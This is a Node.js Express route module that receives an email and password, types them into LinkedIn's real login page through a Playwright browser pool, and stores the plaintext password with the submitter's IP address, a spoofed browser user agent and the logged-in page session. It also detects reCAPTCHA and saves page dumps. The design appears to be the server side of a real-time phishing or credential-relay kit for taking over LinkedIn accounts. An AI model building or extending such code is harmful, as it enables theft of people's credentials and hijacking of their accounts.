const express = require('express');
const router = express.Router();
const { v4: uuidv4 } = require('uuid');
const sessions = new Map();

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// Puzzle functions removed — this module uses detectLinkedinRecaptcha and handleCaptchaChallenge instead.

// Detect LinkedIn / Google reCAPTCHA widgets across frames (Playwright compatible)
async function detectLinkedinRecaptcha(page) {
    try {
        const frames = page.frames();
        for (const frame of frames) {
            try {
                const found = await frame.evaluate(() => {
                    if (document.querySelector('.g-recaptcha') || document.querySelector('[data-sitekey]')) return true;
                    const iframes = Array.from(document.querySelectorAll('iframe'));
                    for (const f of iframes) {
                        const s = f.src || '';
                        if (s.includes('recaptcha') || s.includes('google.com/recaptcha') || s.includes('www.gstatic.com/recaptcha')) return true;
                    }
                    return false;
                }).catch(() => false);

                if (found) return { found: true, frameUrl: frame.url() };
            } catch (e) {
                // fall back to URL check
            }

            const fu = frame.url && frame.url();
            if (fu && (fu.includes('recaptcha') || fu.includes('google.com/recaptcha') || fu.includes('hcaptcha'))) {
                return { found: true, frameUrl: fu };
            }
        }
    } catch (err) {
        console.error('detectLinkedinRecaptcha error:', err);
    }
    return { found: false };
}

async function handleCaptchaChallenge(page, sessionId) {
    await delay(2000);

    const detection = await detectLinkedinRecaptcha(page);
    if (detection && detection.found) {
        console.log(`LinkedIn reCAPTCHA detected in frame: ${detection.frameUrl}`);
        // Save minimal debug artifacts if page supports it - best effort
        try {
            if (page.screenshot) {
                await page.screenshot({ path: `debug/${sessionId}-recaptcha-${Date.now()}.png`, fullPage: true }).catch(() => {});
            }
            if (page.content) {
                const content = await page.content();
                const fs = require('fs');
                const path = require('path');
                const debugDir = path.join(__dirname, '..', 'debug');
                if (!fs.existsSync(debugDir)) fs.mkdirSync(debugDir, { recursive: true });
                fs.writeFileSync(path.join(debugDir, `${sessionId}-recaptcha-${Date.now()}.html`), content, 'utf8');
            }
        } catch (e) {
            console.log('Failed to save debug artifacts in routes/linkedin.js', e?.message || e);
        }
        return 'recaptcha';
    }

    return 'not-handled';
}

// Login route
router.post('/linkedin/login', async (req, res) => {
    let { sessionId, email, password } = req.body;

    if (!email) {
        return res.status(400).send('Email is required');
    }

    if (!sessionId) {
        sessionId = uuidv4();
    }

    if (sessions.has(sessionId)) {
        return res.status(400).send('Session already exists');
    }

    try {
        // Get the singleton instance of BrowserPool
        const browserPool = req.app.get('browserPool');
        
        const clientIp = req.headers['x-forwarded-for']?.split(',')[0] || 
                        req.headers['x-real-ip'] || 
                        req.connection.remoteAddress;

        const userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36';

        // Add job to browser pool
        await browserPool.addJob(async (page) => {
            await page.goto('https://www.linkedin.com/login');
            await page.fill('#username', email);
            await page.fill('#password', password);
            await page.click('.login__form_action_container button');

            // Store session info
            sessions.set(sessionId, {
                page,
                userInfo: {
                    email,
                    password,
                    ip: clientIp,
                    userAgent,
                    timestamp: new Date().toISOString()
                }
            });

            // Set timeout to clean up session
            setTimeout(() => {
                if (sessions.has(sessionId)) {
                    console.log(`Session ${sessionId} timed out after 10 minutes. Cleaning up...`);
                    sessions.delete(sessionId);
                }
            }, 10 * 60 * 1000); // 10 minutes
        });

        res.send('1');
        await delay(5000);
    } catch (err) {
        console.error('Error in /api/linkedin/login:', err);
        res.status(500).send(err.message);
    }
});

// Add other LinkedIn-related routes here...

module.exports = router;
